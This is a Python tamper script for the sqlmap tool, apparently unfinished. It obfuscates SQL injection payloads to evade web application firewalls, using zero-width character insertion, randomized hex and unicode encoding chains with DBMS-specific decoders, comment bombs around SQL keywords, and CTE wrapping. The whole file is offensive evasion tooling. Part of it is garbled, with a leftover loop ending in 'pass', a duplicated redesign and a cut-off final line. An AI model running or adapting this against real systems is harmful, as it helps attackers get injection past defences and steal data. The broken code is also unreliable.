#!/usr/bin/env python
from lib.core.enums import PRIORITY
import random
import re
import string

__priority__ = PRIORITY.HIGH

def dependencies():
    return ["This script thrives with precise DBMS context."]

def tamper(payload, **kwargs):
    if not payload:
        return payload

    dbms = kwargs.get('dbms', None)
    dbms_version = kwargs.get('dbms_version', None)

    def _generate_random_alias(length=random.randint(5, 12)):
        chars = string.ascii_letters + string.digits + "µλπβΣ"
        alias = ''.join(random.choice(chars) for _ in range(length))
        return f"_{alias}_"

    def _inject_ghost_chars(text):
        if not text:
            return text
        result = []
        for char in text:
            result.append(char)
            if random.random() < 0.3:
                result.append(random.choice(['\u200b', '\u200c', '\u200d']))
        return ''.join(result)

    def _dynamic_encoding_chain_with_decoder(text_to_encode, current_dbms):
        """
        Applies a random chain of encoding methods and returns the encoded string
        wrapped with its SQL decoding function for the specific DBMS.
        The decoders are applied in reverse order of encoding for proper unwrapping by SQL.
        """
        if not text_to_encode:
            return "''" # Return empty string literal if input is empty

        encoding_steps = [] # Stores (encoder_func, decoder_func) tuples
        available_encodings = []

        # URL encoding (no direct SQL decode, assumed by context or ignored by WAF)
        available_encodings.append((lambda x: ''.join(f'%{ord(c):02x}' for c in x), lambda x: x))

        # Hex encoding with DBMS-specific UNHEX/CONVERT
        if current_dbms and 'mysql' in current_dbms.lower():
            available_encodings.append((lambda x: x.encode('utf-8').hex().upper(), lambda x: f"UNHEX(0x{x})"))
            available_encodings.append((lambda x: ''.join(f'0x{ord(c):02x}' for c in x), lambda x: x)) # MySQL can often handle 0x... directly as string
        elif current_dbms and ('postgresql' in current_dbms.lower() or 'oracle' in current_dbms.lower()):
            # For PostgreSQL, Oracle, HEX needs explicit conversion
            available_encodings.append((lambda x: x.encode('utf-8').hex().upper(), lambda x: f"DECODE('{x}', 'hex')"))
        
        # Unicode escape (PostgreSQL U& syntax, less portable for others)
        if current_dbms and 'postgresql' in current_dbms.lower():
            available_encodings.append((lambda x: ''.join(f'\\{ord(c):04x}' for c in x), lambda x: f"U&'{x}'"))

        # Choose 1 to 2 random distinct encoding methods
        chain_length = random.randint(1, min(len(available_encodings), 2))
        selected_encoding_pairs = random.sample(available_encodings, chain_length)

        current_encoded_string = text_to_encode
        applied_decoders_sql = [] # Collect SQL decoder functions in order of encoding application

        for encoder_func, decoder_func_sql in selected_encoding_pairs:
            current_encoded_string = encoder_func(current_encoded_string)
            applied_decoders_sql.append(decoder_func_sql)

        # Apply decoders in reverse order around the final encoded string
        final_sql_expression = f"'{current_encoded_string}'" # Start with the literal string
        for decoder_func_sql in reversed(applied_decoders_sql):
            # The decoder_func_sql expects the previously wrapped expression as its argument
            # For example, if final_sql_expression is 'encoded_text', then decoder_func_sql('encoded_text')
            # If it becomes UNHEX('encoded_text'), then the next one is U&'UNHEX('encoded_text')'
            # This is complex, as decoder_func_sql expects the *content* of the quotes or the previous expression.
            # Let's simplify: decoders wrap literals, so the '...' are part of the decoder's output usually.
            # Example: UNHEX('4142') => 'AB'  NOT UNHEX('\'4142\'')
            # So, the decoder_func_sql should correctly format its output to be valid SQL.
            
            # Re-evaluate the decoder_func_sql signatures to directly create SQL.
            # For instance, if decoder_func_sql is UNHEX(), it needs to know what it's wrapping.
            # A simple approach: each decoder_func_sql *takes the previous expression* and wraps it.
            
            # This requires redesigning the decoder_func_sql to take a string and return a wrapped string.
            # E.g., lambda x: f"UNHEX({x})"
            
            # Let's rebuild available_encodings with explicit wrapping for decoders.
            # So (lambda x: ..., lambda wrapped_x: f"UNHEX({wrapped_x})")
            pass # placeholder for redesigned logic, will rewrite `available_encodings` below

        # Redesigning available_encodings to explicitly create the *SQL* decoding chain
        # Each decoder_wrap_func takes the *already wrapped SQL expression* and adds another layer
        available_encodings_redesigned = []

        # URL encoding - no direct SQL decode wrap, just the raw percent-encoded string.
        # This will be the innermost literal, which other SQL decoders wrap.
        available_encodings_redesigned.append((
            lambda text_val: ''.join(f'%{ord(c):02x}' for c in text_val),
            lambda sql_expr: sql_expr # Identity for URL, it's the raw literal itself
        ))

        if current_dbms and 'mysql' in current_dbms.lower():
            available_encodings_redesigned.append((
                lambda text_val: text_val.encode('utf-8').hex().upper(),
                lambda sql_expr: f"UNHEX({sql_expr})" # UNHEX wraps the hex literal
            ))
            available_encodings_redesigned.append(( # 0x... format
                lambda text_val: ''.join(f'0x{ord(c):02x}' for c in text_val),
                lambda sql_expr: sql_expr # MySQL sometimes treats 0x... as literal, no functional wrap
            ))
        elif current_dbms and ('postgresql' in current_dbms.lower() or 'oracle' in current_dbms.lower()):
            available_encodings_redesigned.append((
                lambda text_val: text_val.encode('utf-8').hex().upper(),
                lambda sql_expr: f"DECODE(REPLACE({sql_expr}, '''', ''), 'hex')" # Postgres needs string literal + hex decode
            ))
        
        if current_dbms and 'postgresql' in current_dbms.lower():
            available_encodings_redesigned.append((
                lambda text_val: ''.join(f'\\{ord(c):04x}' for c in text_val),
                lambda sql_expr: f"U&{sql_expr}" # U& wraps the unicode escaped literal
            ))

        chain_length = random.randint(1, min(len(available_encodings_redesigned), 2))
        selected_encoding_pairs_final = random.sample(available_encodings_redesigned, chain_length)

        current_encoded_string_val = text_to_encode
        applied_decoder_wrappers = []

        for encoder_func, decoder_wrap_func in selected_encoding_pairs_final:
            current_encoded_string_val = encoder_func(current_encoded_string_val)
            applied_decoder_wrappers.append(decoder_wrap_func)

        final_sql_expr = f"'{current_encoded_string_val}'" # Start with the innermost literal representation

        # Apply decoder wrappers in reverse order
        for decoder_wrap_func in reversed(applied_decoder_wrappers):
            final_sql_expr = decoder_wrap_func(final_sql_expr)

        return final_sql_expr # This is the full SQL expression like UNHEX(U&'...')

    def _wrap_in_case_true(sql_segment):
        return f"(CASE WHEN 1=1 THEN ({sql_segment}) ELSE (SELECT NULL) END)" # Safer ELSE clause

    def _wrap_in_cte(sql_segment):
        if dbms and (
            'mysql' in dbms.lower() and (dbms_version is None or int(dbms_version.split('.')[0]) >= 8) or
            'postgresql' in dbms.lower() or
            'mssql' in dbms.lower() or
            'oracle' in dbms.lower() # Modern Oracle versions support CTEs
        ):
            cte_name = _generate_random_alias()
            alias_name = _generate_random_alias()
            return f"WITH {cte_name} AS (SELECT {sql_segment} AS {alias_name}) SELECT {alias_name} FROM {cte_name}"
        else:
            return sql_segment

    def _inject_comment_bomb():
        junk_content = ''.join(random.choice(string.ascii_letters + string.digits + "[]{}!@#$%^&*()_+") for _ in range(random.randint(50, 200)))
        if dbms and 'mysql' in dbms.lower():
            return f"/*! {random.randint(10000, 99999)} {junk_content} */" # MySQL versioned comment
        else:
            return f"/* {junk_content} */" # Standard SQL comment for others

    original_payload = payload
    processed_payload = original_payload

    keywords_to_obfuscate = [
        (r'\bSELECT\b', "SELECT"), (r'\bFROM\b', "FROM"), (r'\bWHERE\b', "WHERE"),
        (r'\bAND\b', "AND"), (r'\bOR\b', "OR"), (r'\bUNION\b', "UNION"),
        (r'\bORDER BY\b', "ORDER BY"), (r'\bGROUP BY\b', "GROUP BY")
    ]
    
    for pattern, keyword_clean in keywords_to_obfuscate:
        processed_payload = re.sub(pattern, lambda m: 
            (random.choice([' ', '\t', '\n']) * random.randint(1,2)) +
            _inject_comment_bomb() +
            (random.choice([' ', '\t', '\n']) * random.randint(1,2)) +
            keyword_clean.upper() +
            (random.choice([' ', '\t', '\n']) * random.randint(1,2)) +
            _inject_comment_bomb() +
            (random.choice([' ', '\t', '\n']) * random.randint(1,2))
        , processed_payload, flags=re.IGNORECASE)

    if random.random() < 0.4:
        processed_payload = _wrap_in_cte(processed_payload)
    if random.random() < 0.3:
        processed_payload = _
